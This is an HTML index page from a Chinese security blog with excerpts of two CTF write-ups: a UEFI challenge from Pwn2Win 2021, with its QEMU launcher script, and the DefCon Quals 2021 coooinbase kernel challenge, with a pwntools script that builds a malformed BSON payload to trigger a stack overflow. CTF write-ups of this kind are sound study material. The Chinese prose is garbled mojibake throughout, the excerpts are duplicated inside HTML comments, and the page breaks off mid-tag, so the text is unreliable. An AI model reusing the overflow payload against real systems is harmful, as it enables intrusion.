<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>m0nshaw&#39;s blog</title>
  <meta name="author" content="sung3r">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="m0nshaw&#39;s blog"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 4.2.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">m0nshaw&#39;s blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-user"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>m0nshaw&#39;s blog<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		é£å¹ğŸ‚å“ªé¡µè¯»å“ªé¡µğŸ“¸ğŸ¤—ã€‚

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/06/26/è§£å†³ç¬¬ä¸€ä¸ªUEFI-PWNâ€”â€”Accessing-the-Truthè§£é¢˜æ€è·¯/" title="Pwn2Win CTF 2021 Accessing the Truthçš„è§£é¢˜æ€è·¯">è§£å†³ç¬¬ä¸€ä¸ªUEFI PWNâ€”â€”Accessing the Truthè§£é¢˜æ€è·¯</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-06-26  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/243007" target="_blank" rel="noopener">è§£å†³ç¬¬ä¸€ä¸ªUEFI PWNâ€”â€”Accessing the Truthè§£é¢˜æ€è·¯</a></p>
<p>å‰æ®µæ—¶é—´æ‰“äº†åœºPWN2WINï¼ŒæœŸé—´é‡åˆ°äº†è¿™é“BIOSé¢˜ï¼Œæ­£å¥½æ¥å­¦ä¹ ä¸€ä¸‹UEFI PWN<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622448541945-1622448541947.png" alt="title"></p>
<p>é¢˜ç›®åŒ…å«ä¸‹åˆ—æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622448612466-1622448612467.png" alt="title"></p>
<h1 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h1><p><code>run.py</code>æ˜¯é¢˜ç›®ç»™çš„å¯åŠ¨è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3 -u</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import subprocess</span><br><span class="line">import tempfile</span><br><span class="line"></span><br><span class="line">def random_string(n):</span><br><span class="line">    return &#39;&#39;.join(random.choice(string.ascii_lowercase) for _ in range(n))</span><br><span class="line"></span><br><span class="line">def check_pow(bits):</span><br><span class="line">    r &#x3D; random_string(10)</span><br><span class="line">    print(f&quot;hashcash -mb&#123;bits&#125; &#123;r&#125;&quot;)</span><br><span class="line">    solution &#x3D; input(&quot;Solution: \n&quot;).strip()</span><br><span class="line">    if subprocess.call([&quot;hashcash&quot;, f&quot;-cdb&#123;bits&#125;&quot;, &quot;-r&quot;, r, solution],</span><br><span class="line">                       cwd&#x3D;&quot;&#x2F;tmp&quot;,</span><br><span class="line">                       stdout&#x3D;subprocess.DEVNULL,</span><br><span class="line">                       stderr&#x3D;subprocess.DEVNULL) !&#x3D; 0:</span><br><span class="line">        raise Exception(&quot;Invalid PoW&quot;)</span><br><span class="line"></span><br><span class="line">#check_pow(25)</span><br><span class="line"></span><br><span class="line">fname &#x3D; tempfile.NamedTemporaryFile().name</span><br><span class="line"></span><br><span class="line">subprocess.call([&quot;cp&quot;, &quot;OVMF.fd&quot;, fname])</span><br><span class="line">try:</span><br><span class="line">  subprocess.call([&quot;chmod&quot;, &quot;u+w&quot;, fname])</span><br><span class="line">  subprocess.call([&quot;qemu-system-x86_64&quot;,</span><br><span class="line">                   &quot;-monitor&quot;, &quot;&#x2F;dev&#x2F;null&quot;,</span><br><span class="line">                   &quot;-m&quot;, &quot;64M&quot;,</span><br><span class="line">                   &quot;-drive&quot;, &quot;if&#x3D;pflash,format&#x3D;raw,file&#x3D;&quot; + fname, </span><br><span class="line">                   &quot;-drive&quot;, &quot;file&#x3D;fat:rw:contents,format&#x3D;raw&quot;,</span><br><span class="line">                   &quot;-net&quot;, &quot;none&quot;,</span><br><span class="line">                   &quot;-nographic&quot;], stderr&#x3D;subprocess.DEVNULL, timeout&#x3D;60)</span><br><span class="line">except:</span><br><span class="line">  pass</span><br><span class="line"></span><br><span class="line">subprocess.call([&quot;rm&quot;, &quot;-rf&quot;, fname])</span><br><span class="line">print(&quot;Bye!&quot;)</span><br></pre></td></tr></table></figure>

<p>æ³¨é‡Šæ‰powï¼Œç›´æ¥å¯åŠ¨ã€‚å¯åŠ¨èµ·æ¥æ˜¯ä¸€ä¸ªä½æƒé™ç”¨æˆ·çš„linuxè™šæ‹Ÿæœºï¼Œç›®æ ‡æ˜¯è·å–æ ¹ç›®å½•ä¸‹flag.txtçš„å†…å®¹ï¼Œå…¸å‹çš„å†…æ ¸é¢˜<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449605453-1622449605456.png" alt="title"></p>
<p>ä»”ç»†çœ‹å¯åŠ¨å‘½ä»¤ï¼Œè²Œä¼¼æ²¡åŠ è½½ä»»ä½•å¯ç–‘çš„è™šæ‹Ÿè®¾å¤‡ï¼Œæ’é™¤æ‰QEMUé€ƒé€¸<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449718327-1622449718327.png" alt="title"></p>
<p>è§£å¼€<code>contents/initramfs.cpio</code>ï¼Œçœ‹åˆ°initæ–‡ä»¶ã€‚è¿™é‡Œæœ‰ä¸€æ¡<code>mount -t efivarfs efivarfs /sys/firmware/efi/efivars</code>ï¼Œæ€€ç–‘æ˜¯UEFI PWN<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449853859-1622449853860.png" alt="title"></p>
<p>å¦å¤–ï¼Œå¯åŠ¨è„šæœ¬é‡Œæœ‰60ç§’çš„timoutï¼Œéœ€è¦æŠŠè¿™é‡Œå¹²æ‰<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622450018868-1622450018871.png" alt="title"></p>
	

	</div>
  <a type="button" href="/2021/06/26/è§£å†³ç¬¬ä¸€ä¸ªUEFI-PWNâ€”â€”Accessing-the-Truthè§£é¢˜æ€è·¯/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/243007" target="_blank" rel="noopener">è§£å†³ç¬¬ä¸€ä¸ªUEFI PWNâ€”â€”Accessing the Truthè§£é¢˜æ€è·¯</a></p>
<p>å‰æ®µæ—¶é—´æ‰“äº†åœºPWN2WINï¼ŒæœŸé—´é‡åˆ°äº†è¿™é“BIOSé¢˜ï¼Œæ­£å¥½æ¥å­¦ä¹ ä¸€ä¸‹UEFI PWN<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622448541945-1622448541947.png" alt="title"></p>
<p>é¢˜ç›®åŒ…å«ä¸‹åˆ—æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622448612466-1622448612467.png" alt="title"></p>
<h1 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h1><p><code>run.py</code>æ˜¯é¢˜ç›®ç»™çš„å¯åŠ¨è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3 -u</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import subprocess</span><br><span class="line">import tempfile</span><br><span class="line"></span><br><span class="line">def random_string(n):</span><br><span class="line">    return &#39;&#39;.join(random.choice(string.ascii_lowercase) for _ in range(n))</span><br><span class="line"></span><br><span class="line">def check_pow(bits):</span><br><span class="line">    r &#x3D; random_string(10)</span><br><span class="line">    print(f&quot;hashcash -mb&#123;bits&#125; &#123;r&#125;&quot;)</span><br><span class="line">    solution &#x3D; input(&quot;Solution: \n&quot;).strip()</span><br><span class="line">    if subprocess.call([&quot;hashcash&quot;, f&quot;-cdb&#123;bits&#125;&quot;, &quot;-r&quot;, r, solution],</span><br><span class="line">                       cwd&#x3D;&quot;&#x2F;tmp&quot;,</span><br><span class="line">                       stdout&#x3D;subprocess.DEVNULL,</span><br><span class="line">                       stderr&#x3D;subprocess.DEVNULL) !&#x3D; 0:</span><br><span class="line">        raise Exception(&quot;Invalid PoW&quot;)</span><br><span class="line"></span><br><span class="line">#check_pow(25)</span><br><span class="line"></span><br><span class="line">fname &#x3D; tempfile.NamedTemporaryFile().name</span><br><span class="line"></span><br><span class="line">subprocess.call([&quot;cp&quot;, &quot;OVMF.fd&quot;, fname])</span><br><span class="line">try:</span><br><span class="line">  subprocess.call([&quot;chmod&quot;, &quot;u+w&quot;, fname])</span><br><span class="line">  subprocess.call([&quot;qemu-system-x86_64&quot;,</span><br><span class="line">                   &quot;-monitor&quot;, &quot;&#x2F;dev&#x2F;null&quot;,</span><br><span class="line">                   &quot;-m&quot;, &quot;64M&quot;,</span><br><span class="line">                   &quot;-drive&quot;, &quot;if&#x3D;pflash,format&#x3D;raw,file&#x3D;&quot; + fname, </span><br><span class="line">                   &quot;-drive&quot;, &quot;file&#x3D;fat:rw:contents,format&#x3D;raw&quot;,</span><br><span class="line">                   &quot;-net&quot;, &quot;none&quot;,</span><br><span class="line">                   &quot;-nographic&quot;], stderr&#x3D;subprocess.DEVNULL, timeout&#x3D;60)</span><br><span class="line">except:</span><br><span class="line">  pass</span><br><span class="line"></span><br><span class="line">subprocess.call([&quot;rm&quot;, &quot;-rf&quot;, fname])</span><br><span class="line">print(&quot;Bye!&quot;)</span><br></pre></td></tr></table></figure>

<p>æ³¨é‡Šæ‰powï¼Œç›´æ¥å¯åŠ¨ã€‚å¯åŠ¨èµ·æ¥æ˜¯ä¸€ä¸ªä½æƒé™ç”¨æˆ·çš„linuxè™šæ‹Ÿæœºï¼Œç›®æ ‡æ˜¯è·å–æ ¹ç›®å½•ä¸‹flag.txtçš„å†…å®¹ï¼Œå…¸å‹çš„å†…æ ¸é¢˜<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449605453-1622449605456.png" alt="title"></p>
<p>ä»”ç»†çœ‹å¯åŠ¨å‘½ä»¤ï¼Œè²Œä¼¼æ²¡åŠ è½½ä»»ä½•å¯ç–‘çš„è™šæ‹Ÿè®¾å¤‡ï¼Œæ’é™¤æ‰QEMUé€ƒé€¸<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449718327-1622449718327.png" alt="title"></p>
<p>è§£å¼€<code>contents/initramfs.cpio</code>ï¼Œçœ‹åˆ°initæ–‡ä»¶ã€‚è¿™é‡Œæœ‰ä¸€æ¡<code>mount -t efivarfs efivarfs /sys/firmware/efi/efivars</code>ï¼Œæ€€ç–‘æ˜¯UEFI PWN<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449853859-1622449853860.png" alt="title"></p>
<p>å¦å¤–ï¼Œå¯åŠ¨è„šæœ¬é‡Œæœ‰60ç§’çš„timoutï¼Œéœ€è¦æŠŠè¿™é‡Œå¹²æ‰<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622450018868-1622450018871.png" alt="title"></p>
	
	</div>
  <a type="button" href="/2021/06/26/è§£å†³ç¬¬ä¸€ä¸ªUEFI-PWNâ€”â€”Accessing-the-Truthè§£é¢˜æ€è·¯/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/06/26/PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç»­ç¯‡ï¼šå†…æ ¸æ€PWN/" title="DefCon Quals 2021 coooinbase-kernelçš„è§£é¢˜æ€è·¯">PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç»­ç¯‡ï¼šå†…æ ¸æ€PWN</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-06-26  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/242627" target="_blank" rel="noopener">PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç»­ç¯‡ï¼šå†…æ ¸æ€PWN</a></p>
<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621834179965-1621834179966.png" alt="title"><br>æœ¬ç¯‡æ–‡ç« æ˜¯coooinbaseè¿™é“é¢˜çš„å†…æ ¸æ€åˆ©ç”¨ã€‚ä½œä¸ºä¸Šä¸€ç¯‡æ–‡ç« <code>PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç”¨æˆ·æ€åˆ©ç”¨</code>çš„ç»­ç¯‡ï¼Œæœ¬æ–‡å°†è§£å†³ä¸Šæ–‡é—ç•™ä¸‹çš„ä¸€äº›é—®é¢˜ï¼Œå¹¶åˆ†æä»userlandåˆ°kernelandçš„åˆ©ç”¨æœºä¼šã€‚</p>
<h1 id="é—ç•™ä¸‹çš„é—®é¢˜"><a href="#é—ç•™ä¸‹çš„é—®é¢˜" class="headerlink" title="é—ç•™ä¸‹çš„é—®é¢˜"></a>é—ç•™ä¸‹çš„é—®é¢˜</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'aarch64'</span></span><br><span class="line"></span><br><span class="line">obj = &#123;</span><br><span class="line">    <span class="string">'CVC'</span>:<span class="number">111</span>,</span><br><span class="line">    <span class="string">'MON'</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="string">'YR'</span>: <span class="number">2021</span></span><br><span class="line">&#125;</span><br><span class="line">bs = bson.dumps(obj)</span><br><span class="line"></span><br><span class="line">bs = bs[:<span class="number">-1</span>]</span><br><span class="line">bs += <span class="string">b'\x02'</span></span><br><span class="line">bs += <span class="string">b'CC'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += p32(<span class="number">0x10</span>)</span><br><span class="line">bs += <span class="string">b'A'</span>*(<span class="number">0x60</span>)</span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line">print(b64e(bs)+<span class="string">' '</span>)</span><br></pre></td></tr></table></figure>
<p>è‹¥æŒ‰ç…§ä¸Šä¸€ç¯‡æ–‡ç« çš„bsonç»“æ„å»æ„é€ payloadï¼Œå³<code>&#39;CVC&#39;:111</code>ï¼Œå½“payloadå¤§äºä¸€å®šé•¿åº¦æ—¶ä¼šå¯¼è‡´ä¸èƒ½åˆ°è¾¾ä»¥ä¸‹åˆ†æ”¯ï¼Œæ²¡æ³•è§¦å‘æ¼æ´<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622191188255-1622191188256.png" alt="title"></p>
<p>åŸå› æ˜¯<code>copy_payload</code>çš„è¿”å›å€¼ä¸ä¸º0<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622191874009-1622191874010.png" alt="title"></p>
<p>è®©<code>copy_payload</code>æ‰§è¡Œåˆ°è¿™ä¸ªåˆ†æ”¯å³å¯è¿”å›0ï¼Œç»è¿‡æµ‹è¯•<code>&#39;CVC&#39;:545</code>èƒ½é€šè¿‡check<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622193008468-1622193008469.png" alt="title"></p>
<p>æŒ‰ä»¥ä¸‹æ–¹æ³•æ„é€ bsonåºåˆ—ï¼Œä¾¿èƒ½å‘é€é•¿å­—ç¬¦ä¸²ï¼Œå¹¶è§¦å‘æ ˆæº¢å‡º</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'aarch64'</span></span><br><span class="line"></span><br><span class="line">obj = &#123;</span><br><span class="line">    <span class="string">'CVC'</span>:<span class="number">545</span>,</span><br><span class="line">    <span class="string">'MON'</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="string">'YR'</span>: <span class="number">2021</span></span><br><span class="line">&#125;</span><br><span class="line">bs = bson.dumps(obj)</span><br><span class="line"></span><br><span class="line">bs = bs[:<span class="number">-1</span>]</span><br><span class="line">bs += <span class="string">b'\x02'</span></span><br><span class="line">bs += <span class="string">b'CC'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += p32(<span class="number">0x10</span>)</span><br><span class="line">bs += <span class="string">b'A'</span>*(<span class="number">0x60</span>)</span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line">print(b64e(bs)+<span class="string">' '</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622193238128-1622193238129.png" alt="title"></p>
	

	</div>
  <a type="button" href="/2021/06/26/PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç»­ç¯‡ï¼šå†…æ ¸æ€PWN/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/242627" target="_blank" rel="noopener">PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç»­ç¯‡ï¼šå†…æ ¸æ€PWN</a></p>
<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621834179965-1621834179966.png" alt="title"><br>æœ¬ç¯‡æ–‡ç« æ˜¯coooinbaseè¿™é“é¢˜çš„å†…æ ¸æ€åˆ©ç”¨ã€‚ä½œä¸ºä¸Šä¸€ç¯‡æ–‡ç« <code>PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç”¨æˆ·æ€åˆ©ç”¨</code>çš„ç»­ç¯‡ï¼Œæœ¬æ–‡å°†è§£å†³ä¸Šæ–‡é—ç•™ä¸‹çš„ä¸€äº›é—®é¢˜ï¼Œå¹¶åˆ†æä»userlandåˆ°kernelandçš„åˆ©ç”¨æœºä¼šã€‚</p>
<h1 id="é—ç•™ä¸‹çš„é—®é¢˜"><a href="#é—ç•™ä¸‹çš„é—®é¢˜" class="headerlink" title="é—ç•™ä¸‹çš„é—®é¢˜"></a>é—ç•™ä¸‹çš„é—®é¢˜</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'aarch64'</span></span><br><span class="line"></span><br><span class="line">obj = &#123;</span><br><span class="line">    <span class="string">'CVC'</span>:<span class="number">111</span>,</span><br><span class="line">    <span class="string">'MON'</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="string">'YR'</span>: <span class="number">2021</span></span><br><span class="line">&#125;</span><br><span class="line">bs = bson.dumps(obj)</span><br><span class="line"></span><br><span class="line">bs = bs[:<span class="number">-1</span>]</span><br><span class="line">bs += <span class="string">b'\x02'</span></span><br><span class="line">bs += <span class="string">b'CC'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += p32(<span class="number">0x10</span>)</span><br><span class="line">bs += <span class="string">b'A'</span>*(<span class="number">0x60</span>)</span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line">print(b64e(bs)+<span class="string">' '</span>)</span><br></pre></td></tr></table></figure>
<p>è‹¥æŒ‰ç…§ä¸Šä¸€ç¯‡æ–‡ç« çš„bsonç»“æ„å»æ„é€ payloadï¼Œå³<code>&#39;CVC&#39;:111</code>ï¼Œå½“payloadå¤§äºä¸€å®šé•¿åº¦æ—¶ä¼šå¯¼è‡´ä¸èƒ½åˆ°è¾¾ä»¥ä¸‹åˆ†æ”¯ï¼Œæ²¡æ³•è§¦å‘æ¼æ´<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622191188255-1622191188256.png" alt="title"></p>
<p>åŸå› æ˜¯<code>copy_payload</code>çš„è¿”å›å€¼ä¸ä¸º0<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622191874009-1622191874010.png" alt="title"></p>
<p>è®©<code>copy_payload</code>æ‰§è¡Œåˆ°è¿™ä¸ªåˆ†æ”¯å³å¯è¿”å›0ï¼Œç»è¿‡æµ‹è¯•<code>&#39;CVC&#39;:545</code>èƒ½é€šè¿‡check<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622193008468-1622193008469.png" alt="title"></p>
<p>æŒ‰ä»¥ä¸‹æ–¹æ³•æ„é€ bsonåºåˆ—ï¼Œä¾¿èƒ½å‘é€é•¿å­—ç¬¦ä¸²ï¼Œå¹¶è§¦å‘æ ˆæº¢å‡º</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'aarch64'</span></span><br><span class="line"></span><br><span class="line">obj = &#123;</span><br><span class="line">    <span class="string">'CVC'</span>:<span class="number">545</span>,</span><br><span class="line">    <span class="string">'MON'</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="string">'YR'</span>: <span class="number">2021</span></span><br><span class="line">&#125;</span><br><span class="line">bs = bson.dumps(obj)</span><br><span class="line"></span><br><span class="line">bs = bs[:<span class="number">-1</span>]</span><br><span class="line">bs += <span class="string">b'\x02'</span></span><br><span class="line">bs += <span class="string">b'CC'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += p32(<span class="number">0x10</span>)</span><br><span class="line">bs += <span class="string">b'A'</span>*(<span class="number">0x60</span>)</span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line">print(b64e(bs)+<span class="string">' '</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622193238128-1622193238129.png" alt="title"></p>
	
	</div>
  <a type="button" href="/2021/06/26/PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç»­ç¯‡ï¼šå†…æ ¸æ€PWN/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
